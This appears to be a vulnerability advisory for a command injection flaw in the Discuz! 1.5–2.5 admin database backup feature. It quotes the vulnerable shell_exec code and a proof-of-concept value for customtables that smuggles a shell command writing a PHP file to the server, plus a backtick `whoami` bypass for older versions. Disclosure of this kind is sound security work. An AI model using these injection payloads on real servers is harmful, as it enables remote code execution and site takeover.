## Discuz backend getshell

### Description
The database backup feature in
source/admincp/admincp_db.php in Discuz! 1.5 to 2.5
allows remote attackers to execute arbitrary PHP code.

### VulnerabilityType Other
Code Execution

### Vendor of Product
Tencent

### Affected Product Code Base
Discuz - 1.5 - 2.5

### Affected Component
affected source code file

### Attack Type
Remote

### Impact Code execution
true

### Attack Vectors
Attacker need login backend

### Has vendor confirmed or acknowledged the vulnerability?
true

### Discoverer
MitAh @ Chaitin Tech

### Detail
Take DiscuzX2.5 for example

source/admincp/admincp_db.php

```php
# line 296
@shell_exec($mysqlbin.'mysqldump --force --quick '.($db->version() > '4.1' ? '--skip-opt --create-options' : '-all').' --add-drop-table'.($_GET['extendins'] == 1 ? ' --extended-insert' : '').''.($db->version() > '4.1' && $_GET['sqlcompat'] == 'MYSQL40' ? ' --compatible=mysql40' : '').' --host="'.$dbhost.($dbport ? (is_numeric($dbport) ? ' --port='.$dbport : ' --socket="'.$dbport.'"') : '').'" --user="'.$dbuser.'" --password="'.$dbpw.'" "'.$dbname.'" '.$tablesstr.' > '.$dumpfile);
```

```php
# line 281
$tablesstr = '';
foreach($tables as $table) {
	$tablesstr .= '"'.$table.'" ';
}
```

```php
# line 143
$tables = & $_GET['customtables'];
```

We can easily control the arg `$tablesstr` in function `shell_exec()` to execute code.

### POC 

![](http://oyaf7gkg5.bkt.clouddn.com/discuz1.png)



![](http://oyaf7gkg5.bkt.clouddn.com/discuz2.png)



![](http://oyaf7gkg5.bkt.clouddn.com/discuz3.png)



change `customtables[] = pre_common_admincp_cmenu">aaa; echo '<?php phpinfo(); ?>' > phpinfo.php #`



![](http://oyaf7gkg5.bkt.clouddn.com/discuz4.png)



![](http://oyaf7gkg5.bkt.clouddn.com/discuz5.png)

### Additional Information

#### Discuz - 1.5 - 2.0

`$tables = $_G['gp_customtables']`

use `addslashes()` to escape, but it still works by \`whoami\`

#### Discuz - 3.0 - 3.4

Developers wrote a bug, database backup feature doesn't work. 
However, the vunl still there.
